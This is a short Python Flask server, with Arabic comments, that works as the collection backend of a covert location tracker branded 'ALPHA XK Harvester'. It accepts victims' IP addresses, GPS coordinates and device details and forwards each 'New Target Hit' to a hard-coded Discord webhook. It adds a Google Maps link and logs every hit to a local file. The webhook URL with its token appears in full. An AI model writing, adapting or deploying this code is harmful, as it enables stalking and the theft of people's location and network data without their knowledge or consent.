from flask import Flask, request, jsonify
import requests
import datetime

app = Flask(__name__)

# ضع رابط الويب هوك مال الديسكورد هنا
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1563144154601496596/MNXF9Tckz96MuLHIQAT25Id-A8YuKf20aQgZkyoNrArZtkSRIvM9joLybWFIw7dObh04"

@app.route('/api/track', methods=['POST'])
def track():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data"}), 400

    ip = data.get("ip", "Unknown")
    lat = data.get("lat", "0")
    lon = data.get("lon", "0")
    device = data.get("device", "iOS Device")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # تجهيز الرسالة للديسكورد
    embed = {
        "title": "🎯 New Target Hit",
        "color": 0xE2231A,
        "fields": [
            {"name": "IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "Device", "value": f"`{device}`", "inline": True},
            {"name": "Location", "value": f"[{lat}, {lon}](https://www.google.com/maps?q={lat},{lon})", "inline": False},
            {"name": "Time", "value": timestamp, "inline": False}
        ],
        "footer": {"text": "ALPHA XK Harvester"}
    }

    payload = {
        "username": "Redz Tracker",
        "embeds": [embed]
    }

    # إرسال للديسكورد
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
    except Exception as e:
        print(f"Failed to send to Discord: {e}")

    print(f"[+] Received: IP={ip} | Loc={lat},{lon} | Device={device}")
    
    # حفظ محلي (اختياري)
    with open("hits.txt", "a") as f:
        f.write(f"{timestamp} | {ip} | {lat},{lon} | {device}\n")

    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    # شغله على بورت 5000
    app.run(host='0.0.0.0', port=5000)
